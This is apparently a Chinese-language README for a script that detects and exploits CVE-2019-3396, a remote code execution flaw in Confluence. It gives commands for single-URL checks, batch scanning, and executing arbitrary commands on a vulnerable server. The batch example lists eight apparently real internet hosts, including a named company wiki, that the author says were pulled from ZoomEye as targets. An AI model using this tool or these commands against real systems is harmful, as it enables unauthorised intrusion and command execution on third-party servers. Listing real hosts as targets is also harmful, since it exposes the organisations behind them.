# CVE-2019-3396
Confluence RCE漏洞检测脚本
使用方法：

【1】单url检测，url格式请看示例

```shell
python Confluence_rce_cve-2019-3396.py http://192.168.246.131:8090
```

![](https://github.com/mntn0x/CVE-2019-3396/blob/master/%E5%8D%95url.png)

【2】批量检测，url格式请看示例

从zoomeye上找的前8个confluence的网站，保存在本地

```
http://107.198.101.46:8090
https://100.26.183.111:8443
http://76.94.243.179:9443
http://107.190.131.234:8090
http://107.23.65.244:8090
http://107.213.10.237:8090
http://107.190.131.237:8090
https://wiki.glooko.com
```

运行命令:

```shell
python Confluence_rce_cve-2019-3396.py -f confluence.txt
```

![](https://github.com/mntn0x/CVE-2019-3396/blob/master/%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B.png)

批量检测，最后会输出有漏洞的域名，并且会将输出默认保存在`confluence_output.txt`文件，也可以通过参数`-o output_file`来指定输出文件位置。

【3】rce

在通过第一步poc_check 之后，可以调用rce函数来执行命令：

```shell
python Confluence_rce_cve-2019-3396.py http://192.168.246.131:8090 --command "ls -l"
```

![](https://github.com/mntn0x/CVE-2019-3396/blob/master/rce.png)
